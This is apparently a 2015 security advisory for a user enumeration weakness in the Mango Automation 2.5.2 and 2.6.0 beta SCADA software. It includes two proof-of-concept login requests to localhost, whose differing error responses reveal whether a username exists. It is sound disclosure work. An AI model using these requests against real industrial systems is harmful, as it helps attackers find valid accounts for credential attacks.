@@ -1,0 +1,87 @@
+
+Mango Automation 2.6.0 User Enumeration Weakness
+
+
+Vendor: Infinite Automation Systems Inc.
+Product web page: http://www.infiniteautomation.com
+Affected version: 2.5.2 and 2.6.0 beta (build 327)
+
+Summary: Mango Automation is a flexible SCADA, HMI
+And Automation software application that allows you
+to view, log, graph, animate, alarm, and report on
+data from sensors, equipment, PLCs, databases, webpages,
+etc. It is easy, affordable, and open source.
+
+Desc: The weakness is caused due to the 'login.htm' script
+and how it verifies provided credentials. Attacker can
+use this weakness to enumerate valid users on the affected
+node.
+
+Tested on: Microsoft Windows 7 Professional SP1 (EN) 32/64bit
+           Microsoft Windows 7 Ultimate SP1 (EN) 32/64bit
+           Jetty(9.2.2.v20140723)
+           Java(TM) SE Runtime Environment (build 1.8.0_51-b16)
+           Java HotSpot(TM) Client VM (build 25.51-b03, mixed mode)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2015-5256
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5256.php
+
+
+20.08.2015
+
+--
+
+
+Request for non-existent username:
+----------------------------------
+
+POST /login.htm HTTP/1.1
+Host: localhost:8080
+Content-Length: 29
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Origin: http://localhost:8080
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Referer: http://localhost:8080/login.htm;jsessionid=6zpfpnxljyzf13l3zrpx9e0xd
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8
+Cookie: MANGO8080=6zpfpnxljyzf13l3zrpx9e0xd
+
+username=noob&password=123123
+
+
+Response:
+
+ - <td class="formError">User id not found</td>
+
+
+Request for existent username:
+------------------------------
+
+POST /login.htm HTTP/1.1
+Host: localhost:8080
+Content-Length: 32
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Origin: http://localhost:8080
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Referer: http://localhost:8080/login.htm
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8
+Cookie: MANGO8080=6zpfpnxljyzf13l3zrpx9e0xd
+
+username=admin&password=123123
+
+
+Response:
+
+ - <td colspan="3" class="formError">Invalid login<br/>
